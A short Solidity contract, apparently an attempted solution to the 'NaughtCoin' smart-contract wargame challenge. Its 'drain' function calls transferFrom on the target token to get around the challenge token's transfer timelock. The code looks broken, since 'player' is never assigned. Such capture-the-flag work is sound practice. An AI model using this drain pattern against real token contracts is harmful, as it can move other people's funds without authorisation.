// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin-latest/contracts/token/ERC20/ERC20.sol';

contract HoldThis {
    AbstractNaughtCoin naughtCoin;
    address private player;
    constructor(address _address) {
        naughtCoin= AbstractNaughtCoin(_address);
    }
    function drain (uint256 value) public {
        naughtCoin.transferFrom(player, address(this), value);
    }
}

abstract contract AbstractNaughtCoin is ERC20 {}